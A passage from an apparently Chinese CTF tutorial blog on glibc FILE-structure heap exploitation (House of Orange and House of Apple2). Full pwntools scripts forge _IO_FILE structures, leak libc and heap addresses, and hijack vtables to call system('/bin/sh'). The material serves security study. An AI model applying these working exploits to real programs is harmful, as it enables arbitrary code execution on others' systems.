class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Length of name :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Name :&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Price of Orange:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Color of Orange:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Length of name :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Price of Orange:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;20&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Color of Orange:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;chunk0&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="number">0x100</span>,payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;cccccccc&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span>-<span class="number">0x610</span></span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pause()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(io_list_all))</span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">15</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;db&#x27;</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">sys_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr+<span class="number">0x430</span>))</span><br><span class="line">pause()</span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(heap_addr+<span class="number">0x430</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(heap_addr+<span class="number">0x508</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)</span><br><span class="line">bug()</span><br><span class="line">edit(<span class="number">0x1000</span>,payload)</span><br><span class="line">bug()</span><br><span class="line">p.interactive()</span><br><span class="line">payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)  <span class="comment">#堆溢出覆盖</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) flags字段，且将size位伪造为<span class="number">0x61</span>，进入smallbin</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) fd和bk</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x508</span>)<span class="comment">#vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)<span class="comment">#DUMMY finish overflow</span></span><br></pre></td></tr></table></figure>

<p>将chain字段构造为flags的地址，也就是smallbins的头部</p>
<p><img src="/2025/11/18/IO/1756318696382-a2660f42-da02-4508-a89e-b47f07581bc0.png" alt="img"><img src="/2025/11/18/IO/1756318720210-a1410223-3a0d-4c98-ac62-a84e8f5c228c.png" alt="img"></p>
<p>将vtable就写成vtable所在的地址</p>
<p><img src="/2025/11/18/IO/1756318912707-dd71d112-1cd9-413a-a17b-4d391ed4b228.png" alt="img"></p>
<p>原理：因为unsortedbin得链表已经被破坏，在遍历链表的时候就发生错误，就会调用errout，而errout调用的是malloc_printerr，其又主要调用了_libc_message函数，又调用了abort，而about中调用fflush（NULL）</p>
<p><img src="/2025/11/18/IO/1756367402001-75ea793f-036a-4125-9bed-8f1ddebb082e.jpeg" alt="img"></p>
<p>将vtable就写成vtable所在的地址，往后面第四个写system地址（虚表中overflow就位于第四个），也就相当于调用system并且将链表头部节点作为参数也就是&#x2F;bin&#x2F;sh的地址，就调用了system（&#x2F;bin&#x2F;sh）获得shell</p>
<h2 id="2-24-2-26"><a href="#2-24-2-26" class="headerlink" title="2.24-2.26"></a>2.24-2.26</h2><p>2.24-2.26 加入虚表保护，虚表需要在一定范围里面这时候在这样构造</p>
<p><img src="/2025/11/18/IO/1756626660579-1b6052a1-a9ea-4950-81c9-e5118efaaea9.png" alt="img"></p>
<p><strong>_IO_str_finish</strong></p>
<p><img src="/2025/11/18/IO/1757332053371-c86312db-ff23-4f91-9e97-e5ce1087280a.png" alt="img"></p>
<p>将&#x2F;bin&#x2F;sh地址写在偏移0x38的地方也就是IO_buf_base </p>
<p>将system写在偏移0xe8的地方</p>
<p>这样就会调用system(&#x2F;bin&#x2F;sh)</p>
<p>查找IO_str_jumps</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">hex</span>(possible_IO_str_jumps_offset))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)  <span class="comment">#堆溢出覆盖</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>) flags字段，且将size位伪造为<span class="number">0x61</span>，进入smallbin</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) fd和bk</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(bin_sh)+p64(<span class="number">0</span>)*<span class="number">5</span> <span class="comment">#IO_buf_base = &amp;/bin/sh offset = 0x38(7)</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#chain</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">payload+=p64(IO_str_jumps-<span class="number">0x8</span>)<span class="comment">#vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(sys_addr) <span class="comment">#IO file offset = 0xe8 (29)</span></span><br></pre></td></tr></table></figure>

<p>2.27</p>
<p>2.27开始移除了abort函数中的fflush(NULL)，劫持_IO_list_all就失效了</p>
<p>2.29 </p>
<p>2.29开始虚表是可以写的，如果有任意地址写的漏洞可以直接改虚表函数指针</p>
<h1 id="4-House-of-Apple2"><a href="#4-House-of-Apple2" class="headerlink" title="4.House of Apple2"></a>4.House of Apple2</h1><h2 id="（1）2-35House-of-Apple2（system）"><a href="#（1）2-35House-of-Apple2（system）" class="headerlink" title="（1）2.35House of Apple2（system）"></a>（1）2.35House of Apple2（system）</h2><h3 id="执行exit的流程："><a href="#执行exit的流程：" class="headerlink" title="执行exit的流程："></a>执行exit的流程：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">--&gt;&gt;_IO_wdoallocbuf</span><br><span class="line">    --&gt;&gt;_IO_WDOALLOCATE</span><br><span class="line">        --&gt;&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)/</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable-&gt;_doallocate)(fp)</span><br></pre></td></tr></table></figure>

<p>f-&gt;flags!&#x3D;0x8  &amp;&amp;  f-&gt;flags!&#x3D;0x800 &amp;&amp; f-&gt;flags!&#x3D;0x2</p>
<p>vtable设置为_IO_wfile_jumps使其能成功调用_IO_wfile_overflow即可</p>
<p>_wide_data设置为可控堆地址heap_addr1，即满足*(f + 0xa0) &#x3D; heap_addr1</p>
<p>_wide_data-&gt;_IO_write_base设置为0，即满足*(heap_addr1 + 0x18) &#x3D; 0</p>
<p>_wide_data-&gt;_IO_buf_base设置为0，即满足*(heap_addr1 + 0x30) &#x3D; 0</p>
<p>_wide_data-&gt;_wide_vtable设置为可控堆地址heap_addr2，即满足*(heap_addr1 + 0xe0) &#x3D; heap_addr2</p>
<p>_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持执行流，即满足*(heap_addr2 + 0x68) &#x3D; C</p>
<p><img src="/2025/11/18/IO/1757484619981-c66360a3-783a-4b93-a0d1-d3ed9575e3a8.png" alt="img"></p>
<h3 id="这里回答一些问题？"><a href="#这里回答一些问题？" class="headerlink" title="这里回答一些问题？"></a>这里回答一些问题？</h3><h4 id="1-为什么要将虚表的地址写为IO-wfile-jumps"><a href="#1-为什么要将虚表的地址写为IO-wfile-jumps" class="headerlink" title="1.为什么要将虚表的地址写为IO_wfile_jumps"></a>1.为什么要将虚表的地址写为IO_wfile_jumps</h4><p>因为我们将stderr劫持了，虚表的地址就变化了，他就调用_IO_vtable_check检查，但是我们将虚表的地址改为IO_wfile_jumps，他就不会触发保护、</p>
<h4 id="2-heap2为什么要这样布局"><a href="#2-heap2为什么要这样布局" class="headerlink" title="2.heap2为什么要这样布局"></a>2.heap2为什么要这样布局</h4><p><img src="/2025/11/18/IO/1757425507971-b25c787d-a50b-4337-a54a-ef2ae59e9977.png" alt="img"></p>
<p>我们可以看到 rax &#x3D; {rax+0xe0(28)这个地方的地址}</p>
<p>其实就是wide_data的vtable </p>
<p>也就是rax &#x3D; {wide_data的vtable}的值</p>
<p>我们将vtable的值写成了heap2的头也就是</p>
<p>rax就是heap2的地址</p>
<p>然后取出call &#x3D; rax+0x68这个地址里面的值</p>
<p>也就是我们需要将system的地址写入上面这个rax+0x68这个地方(这里其实就是__doallocate)</p>
<p>我们将rax+0xe8(28)这个地方写入一个地址就写heap2的头地址，然后heap2+0x68(13)写system的地址就可以</p>
<p>3.为什么要把sh；写在heap1的pre_size位，以及为什么是sh；</p>
<p>这里关键就是要找rdi的赋值</p>
<p><img src="/2025/11/18/IO/1757430398318-32e1807d-a579-4bdc-9901-bfca0bfbe677.png" alt="img"></p>
<p>我们可以看到r15的值是rip+0x18cd1e这个地方的值</p>
<p>而这个值就是_IO_list_all这个地址中的值，这个地址中本来放的是stderr，我们通过largebinattack改成了heap1的头地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(listall<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>

<p>r15 &#x3D; heap1的头地址</p>
<p><img src="/2025/11/18/IO/1757430524893-6c4c2ba4-24ce-4e2e-8a2c-fe862b95cd11.png" alt="img"></p>
<p>rdi &#x3D; heap1的头地址</p>
<p>往heap1的头地址写入&#x2F;bin&#x2F;sh（其实就是pre_size &#x3D; &#x2F;bin&#x2F;sh），rdi就为&#x2F;bin&#x2F;sh的地址</p>
<p>但是其值不满足flags的条件所以改为空格sh;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>) #末尾为<span class="number">0x8</span>可以改下一个的pre_size位</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)</span><br><span class="line">edit(<span class="number">1</span>,b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x420</span>+b<span class="string">&#x27; sh;&#x27;</span>)</span><br><span class="line">#fake_io = p64(<span class="number">0</span>) <span class="meta">#flags </span></span><br><span class="line">#fake_io += p64(<span class="number">0</span>)#IO read ptr</span><br><span class="line">fake_io = p64(<span class="number">0</span>)#IO read end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#I0 read base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write base</span><br><span class="line">fake_io += p64(<span class="number">1</span>)#IO write ptr</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_save_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_backup_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_save_end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_markers</span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="meta">#chain</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0xffffffffffffffff</span>)#old_offset</span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(addr1)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io += p64(addr2)#_wide_data</span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_io += p64(_IO_wfile_jumps)<span class="meta">#vtable</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(system)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(addr2))</span><br><span class="line">from pwn import *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="meta">#context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="meta">#p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,28168)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def add(idx,size):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.send(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    p.send(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    p.send(str(size))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(idx):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.send(b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    p.send(str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.send(b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    p.send(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">    p.send(b<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    p.send(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)</span><br><span class="line">edit(<span class="number">1</span>,b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x420</span>+b<span class="string">&#x27; sh;&#x27;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)        </span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="string">&#x27;\x00&#x27;</span>))<span class="number">-0x21b0e0</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">edit(<span class="number">0</span>,b<span class="string">&#x27;a&#x27;</span>*<span class="number">15</span>+b<span class="number">&#x27;b</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">show(0)</span></span><br><span class="line"><span class="string">p.recvuntil(b&#x27;</span>ab<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">addr2 = u64(p.recv(6).ljust(8, b&#x27;</span>\x00<span class="string">&#x27;)) #0</span></span><br><span class="line"><span class="string">addr1 = addr2+0x890 #2</span></span><br><span class="line"><span class="string">_IO_wfile_jumps = libc_base+libc.sym[&#x27;</span>_IO_wfile_jumps<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">listall = libc_base + libc.sym[&#x27;</span>_IO_list_all<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">system = libc_base +libc.sym[&#x27;</span>system<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">log.success(&quot; listall --&gt; &quot;+hex(listall))</span></span><br><span class="line"><span class="string">ogg = libc_base +0xebc81 #0xebc85 0xebc88 0xebc88 0xebd38 0xebd3f 0xebd43</span></span><br><span class="line"><span class="string">#bug()</span></span><br><span class="line"><span class="string">edit(0,p64(0)*3+p64(listall-0x20))</span></span><br><span class="line"><span class="string">add(4,0x500)</span></span><br><span class="line"><span class="string">#bug()</span></span><br><span class="line"><span class="string">#fake_io = p64(0) #flags </span></span><br><span class="line"><span class="string">#fake_io += p64(0)#IO read ptr</span></span><br><span class="line"><span class="string">fake_io = p64(0)#IO read end</span></span><br><span class="line"><span class="string">fake_io += p64(0)#I0 read base</span></span><br><span class="line"><span class="string">fake_io += p64(0)#IO write base</span></span><br><span class="line"><span class="string">fake_io += p64(1)#IO write ptr</span></span><br><span class="line"><span class="string">fake_io += p64(0)#IO write end</span></span><br><span class="line"><span class="string">fake_io += p64(0)#IO buf base</span></span><br><span class="line"><span class="string">fake_io += p64(0)#IO buf end</span></span><br><span class="line"><span class="string">fake_io += p64(0)#_IO_save_base</span></span><br><span class="line"><span class="string">fake_io += p64(0)#_IO_backup_base</span></span><br><span class="line"><span class="string">fake_io += p64(0)#_IO_save_end</span></span><br><span class="line"><span class="string">fake_io += p64(0)#_markers</span></span><br><span class="line"><span class="string">fake_io += p64(0)#chain</span></span><br><span class="line"><span class="string">fake_io += p64(0)</span></span><br><span class="line"><span class="string">fake_io += p64(0xffffffffffffffff)#old_offset</span></span><br><span class="line"><span class="string">fake_io += p64(0)</span></span><br><span class="line"><span class="string">fake_io += p64(addr1)</span></span><br><span class="line"><span class="string">fake_io += p64(0)*2</span></span><br><span class="line"><span class="string">fake_io += p64(addr2)#_wide_data</span></span><br><span class="line"><span class="string">fake_io += p64(0)*6</span></span><br><span class="line"><span class="string">fake_io += p64(_IO_wfile_jumps)#vtable</span></span><br><span class="line"><span class="string">edit(2,fake_io)</span></span><br><span class="line"><span class="string">fake_jump = b&#x27;</span>a<span class="string">&#x27;*88+p64(ogg)</span></span><br><span class="line"><span class="string">edit(0,p64(0)*11+p64(system)+p64(0)*14+p64(addr2))</span></span><br><span class="line"><span class="string">bug()</span></span><br><span class="line"><span class="string">p.sendline(b&#x27;</span><span class="number">5</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>

<p> p *(struct _IO_FILE_plus *)</p>
<p><img src="/2025/11/18/IO/1757487139009-d1208a18-6c13-486b-8b0c-b8575a375f6c.png" alt="img"></p>
<p><img src="/2025/11/18/IO/1757939145635-0a23f733-f8fa-468e-a9e1-10472b590f03.png" alt="img"></p>
<p>还可以这样构造将wide_date 写heap1的头偏移0xe0(28)的地方写system 所在地址-0x68也就是heap1+0x80的地址</p>
<p>这样只需要一个堆块就可以</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#fake_io = p64(<span class="number">0</span>) <span class="meta">#flags </span></span><br><span class="line">#fake_io += p64(<span class="number">0</span>)#IO read ptr</span><br><span class="line">fake_io = p64(<span class="number">0</span>)#IO read end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#I0 read base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write base</span><br><span class="line">fake_io += p64(<span class="number">1</span>)#IO write ptr</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_save_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_backup_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_save_end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_markers</span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="meta">#chain</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0xffffffffffffffff</span>)#old_offset</span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_lock </span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io += p64(addr1)#_wide_data</span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_io += p64(_IO_wfile_jumps)<span class="meta">#vtable</span></span><br><span class="line">fake_io += p64(addr1+<span class="number">0x80</span>) #<span class="number">28</span>  #_wide_vtable</span><br><span class="line">fake_io += p64(system)          #__doallocate</span><br></pre></td></tr></table></figure>

<h4 id="总结：结合前面的理解"><a href="#总结：结合前面的理解" class="headerlink" title="总结：结合前面的理解"></a>总结：结合前面的理解</h4><p>offset &#x3D; 0xe0这个位置就是wide_data的vtable </p>
<p>p *(struct _IO_wide_data *)</p>
